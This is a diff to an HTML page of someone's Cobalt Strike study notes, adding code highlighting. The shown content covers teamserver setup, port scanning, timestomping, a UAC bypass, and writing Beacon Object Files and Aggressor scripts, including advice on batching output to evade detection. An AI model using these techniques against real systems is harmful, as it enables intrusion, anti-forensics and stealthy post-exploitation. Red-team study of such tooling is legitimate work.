@@ -5,6 +5,11 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Cobalt Strike Notes</title>
     <link rel="stylesheet" href="style.css">
+    <script src="highlight.js"></script>
+    <script src="languages.js"></script>
+    <script>
+        hljs.highlightAll();
+    </script>
 </head>
 <body>
     <h1 style="text-align: left;">
@@ -39,7 +44,7 @@ Malleable helps create configs, these configs will put the data inside fake HTML
         5. run cmd as admin
     </p>
 
-    <pre class="codeblock"><code class="codeblock">teamserver.bat [Host-IPaddress] [password] 1359593325 0ce2f55444e4793516b5afe967be9255 intl-cook.iqiyi.com_MDq.profile</code></pre>
+    <pre class="codeblock"><code class="language-cpp">teamserver.bat [Host-IPaddress] [password] 1359593325 0ce2f55444e4793516b5afe967be9255 intl-cook.iqiyi.com_MDq.profile</code></pre>
 
     <p class="mynote">
         run this command to create server<br>
@@ -65,7 +70,7 @@ Malleable helps create configs, these configs will put the data inside fake HTML
 
     <h2>How to portscan:</h2>
 
-    <pre class="codeblock"><code class="codeblock">portscan 192.168.231.0/24 22,445,3389 arp: this command will scan for open ports.</code></pre>
+    <pre class="codeblock"><code class="language-cpp">portscan 192.168.231.0/24 22,445,3389 arp: this command will scan for open ports.</code></pre>
 
     <h2>How to timestomp</h2>
 
@@ -73,7 +78,7 @@ Malleable helps create configs, these configs will put the data inside fake HTML
         this command allows to copy the date modified to paste into another file.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">timestomp C:\Users\kingx\Documents\test.txt C:\Windows\System32\cmd.exe</code></pre>
+    <pre class="codeblock"><code class="language-cpp">timestomp C:\Users\kingx\Documents\test.txt C:\Windows\System32\cmd.exe</code></pre>
 
     <h2>Bypass UAC</h2>
 
@@ -81,7 +86,7 @@ Malleable helps create configs, these configs will put the data inside fake HTML
         First you'll need an user that has administrator privilege, by doing
     </p>
 
-    <pre class="codeblock"><code class="codeblock">shell net localgroup administrators</code></pre>
+    <pre class="codeblock"><code class="language-cpp">shell net localgroup administrators</code></pre>
 
     <p class="mynote">
         to see if the target user has admin priv.<br>
@@ -89,7 +94,7 @@ Malleable helps create configs, these configs will put the data inside fake HTML
         Now you can try to paste the token from another trusted process into your beacon.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">elevate uac-token-duplication lab_http_port80</code></pre>
+    <pre class="codeblock"><code class="language-cpp">elevate uac-token-duplication lab_http_port80</code></pre>
 
     <p class="mynote">
         . // THIS MAKES NO SENSE. Most of the Cobalt Strike Bypass UAC is outdated.
@@ -129,7 +134,7 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
     </p>
     <p class="mynote">Here's a simple list directory command <code class="inlinecode">-ls</code> that will list all the files and directories in the given path.</p>
 
-    <pre class="codeblock"><code class="codeblock">void go(char* buff, int len) {
+    <pre class="codeblock"><code class="language-cpp">void go(char* buff, int len) {
     datap data;
     WIN32_FIND_DATAA file_data;
     HANDLE file_handle = NULL;
@@ -140,18 +145,18 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
 
     <p class="mynote"><strong>To get the args from the command line we need to use <code class="inlinecode">BeaconDataParse</code> to parse the data to <code class="inlinecode">datap</code> struct. We need to extract the data from <code class="inlinecode">buf</code>, <code class="inlinecode">len</code>.</strong></p>
 
-    <pre class="codeblock"><code class="codeblock">    target_dir = BeaconDataExtract(&amp;data, &amp;length);</code></pre>
+    <pre class="codeblock"><code class="language-cpp">    target_dir = BeaconDataExtract(&amp;data, &amp;length);</code></pre>
 
     <p class="mynote"><strong><code class="inlinecode">BeaconDataExtract</code> will extract String from the data to <code class="inlinecode">target_dir</code>. <code class="inlinecode">BeaconDataInt</code> will extract Integer from the data. The order depends on how we <code class="inlinecode">bof_pack</code> the arguments in cna.</strong></p>
 
-    <pre class="codeblock"><code class="codeblock">    int out_size = 0;
+    <pre class="codeblock"><code class="language-cpp">    int out_size = 0;
     BeaconFormatAlloc(&amp;out_buffer, 8192);</code></pre>
 
     <p class="mynote"><strong>If we use <code class="inlinecode">BeaconPrintf</code> it will sent the a lot data to the teamserver simutaneously. That's easy to be detected.
         So we need to use <code class="inlinecode">BeaconFormatAlloc</code> to allocate a buffer to store the data. Then put all the print data inside the buffer by using <code class="inlinecode">BeaconFormatPrintf</code>.
         Finally use <code class="inlinecode">BeaconFormatToString</code> to convert the buffer to a string and print it to the teamserver. This method only send one packet to the teamserver.</strong></p>
 
-    <pre class="codeblock"><code class="codeblock">    file_handle = FindFirstFileA(target_dir, &amp;file_data);
+    <pre class="codeblock"><code class="language-cpp">    file_handle = FindFirstFileA(target_dir, &amp;file_data);
     if (file_handle == INVALID_HANDLE_VALUE)
     {
         BeaconPrintf(CALLBACK_ERROR, "FAILED TO FIND FIRST FILE\n");
@@ -178,13 +183,13 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
         But remember to declare APIs you are using or it won't work.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);</code></pre>
+    <pre class="codeblock"><code class="language-cpp">DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);</code></pre>
 
     <p class="mynote">
         Here's how to declare one. I made a macro for shorter call:
     </p>
 
-    <pre class="codeblock"><code class="codeblock">#define CloseHandle KERNEL32$CloseHandle</code></pre>
+    <pre class="codeblock"><code class="language-cpp">#define CloseHandle KERNEL32$CloseHandle</code></pre>
 
     <p class="mynote">
         The rest will be the same, also don't forget the dll: <code class="inlinecode">KERNEL32$</code>. You can check <a href="function_finder.html">FunctionFinder</a> to find which dll is this API in.
@@ -196,7 +201,7 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
         Here's a more advanced <code class="inlinecode">go()</code> function that supports multiple modes (ls, cd, mkdir, rm, etc.) dispatched from a single entry point.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">void go(char* buff, int len) {
+    <pre class="codeblock"><code class="language-cpp">void go(char* buff, int len) {
     datap data;
     int length = 0;
     char curr_dir[MAX_PATH];
@@ -218,7 +223,7 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
 
     <h2>execute_ls full example</h2>
 
-    <pre class="codeblock"><code class="codeblock">void execute_ls(datap* req_data) {
+    <pre class="codeblock"><code class="language-cpp">void execute_ls(datap* req_data) {
     char* target_dir = BeaconDataExtract(req_data, &length);
     BeaconFormatAlloc(&out_buffer, 8192);
     file_handle = FindFirstFileA(target_dir, &file_data);
@@ -241,16 +246,16 @@ inject C# code inside. The creation of a new process is easy to be spotted.<br>
         <code class="inlinecode">#$3 #$4</code> is the second, third...
     </p>
 
-    <pre class="codeblock"><code class="codeblock">alias -ls {
+    <pre class="codeblock"><code class="language-cpp">alias -ls {
     local('$barch $handle $data $args');
 }</code></pre>
     <p class="mynote">declarations: <code class="inlinecode">$</code> is a variable and <code class="inlinecode">@</code> is an array.</p>
-    <pre class="codeblock"><code class="codeblock">if (size(@_) != 2) {
+    <pre class="codeblock"><code class="language-cpp">if (size(@_) != 2) {
     berror($1, "How to use: -ls [path]");
     return;
 }</code></pre>
     <p class="mynote">Checks if input is valid.</p>
-    <pre class="codeblock"><code class="codeblock">$barch  = barch($1);
+    <pre class="codeblock"><code class="language-cpp">$barch  = barch($1);
 $handle = openf(script_resource("BOF2. $+ $barch $+ .obj"));
 $data   = readb($handle, -1);
 closef($handle);
@@ -264,7 +269,7 @@ closef($handle);
             <li><code class="inlinecode">script_resource()</code>: returns the full path from our cna script — it connects our file with the path. eg: <code class="inlinecode">$bof_path = "C:\Users\KingX\Documents\Test\BOF2.x86.obj"</code></li>
         </ul>
     </div>
-    <pre class="codeblock"><code class="codeblock">$args = bof_pack($1, "z", $2);
+    <pre class="codeblock"><code class="language-cpp">$args = bof_pack($1, "z", $2);
 </code></pre>
     <div class="mynote">
         <ul style="margin: 8px 0;">
@@ -281,7 +286,7 @@ closef($handle);
             </li>
         </ul>
     </div>
-    <pre class="codeblock"><code class="codeblock">btask($1, "Sending to Beacon...");
+    <pre class="codeblock"><code class="language-cpp">btask($1, "Sending to Beacon...");
 beacon_inline_execute($1, $data, "go", $args);
 </code></pre>
     <div class="mynote">
@@ -354,7 +359,7 @@ beacon_inline_execute($1, $data, "go", $args);
         <code class="inlinecode">on beacon_output</code> is an event function. Every time beacon outputs something it will execute this code section.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">on beacon_output {
+    <pre class="codeblock"><code class="language-cpp">on beacon_output {
     local('$bid $out');
     $bid = $1;
     $out = $2;
@@ -366,7 +371,7 @@ beacon_inline_execute($1, $data, "go", $args);
         Why we don't use <code class="inlinecode">eq</code> or <code class="inlinecode">==</code>: because <code class="inlinecode">eq</code> and <code class="inlinecode">==</code> require an exact string. <code class="inlinecode">"*[-zaza]*"</code> uses <code class="inlinecode">*</code> to match everything before and after <code class="inlinecode">[-zaza]</code>. You can also do <code class="inlinecode">"*[-zaza] ?*" iswm $out</code> — the <code class="inlinecode">?</code> will represent 1 character. So if the beacon_output doesn't contain <code class="inlinecode">[-zaza]</code> it will return the function.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">    if ("*[-zaza] -1*" iswm $out) {
+    <pre class="codeblock"><code class="language-cpp">    if ("*[-zaza] -1*" iswm $out) {
         berror($bid, "BOF failed (returned -1). Check path or permissions.");
         return;
     }</code></pre>
@@ -375,7 +380,7 @@ beacon_inline_execute($1, $data, "go", $args);
         The beacon print <code class="inlinecode">[-zaza] -1</code> means the BOF failed.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">    if ("*[-zaza] 1*" iswm $out) {
+    <pre class="codeblock"><code class="language-cpp">    if ("*[-zaza] 1*" iswm $out) {
         blog($bid, "BOF succeeded! Listing...");
         execute_zaza($bid, "ls", "*");
         return;
@@ -388,7 +393,7 @@ beacon_inline_execute($1, $data, "go", $args);
 
     <h2>Bind and Lambda function</h2>
 
-    <pre class="codeblock"><code class="codeblock">bind Ctrl+Shift+Z {
+    <pre class="codeblock"><code class="language-cpp">bind Ctrl+Shift+Z {
     binput($1, "shell whoami /priv");
 }</code></pre>
 
@@ -396,7 +401,7 @@ beacon_inline_execute($1, $data, "go", $args);
         <code class="inlinecode">bind</code> lets you create a keyboard shortcut. <code class="inlinecode">Ctrl + Shift + Z</code> will run <code class="inlinecode">shell whoami /priv</code> as a beacon command.
     </p>
 
-    <pre class="codeblock"><code class="codeblock">&amp;code = lambda(&amp;code_section, &amp;new_var = &amp;old_var);</code></pre>
+    <pre class="codeblock"><code class="language-cpp">&amp;code = lambda(&amp;code_section, &amp;new_var = &amp;old_var);</code></pre>
 
     <p class="mynote">
         <code class="inlinecode">lambda()</code> is used to create a closure — it captures a reference to an existing variable into a new variable name inside the code section.
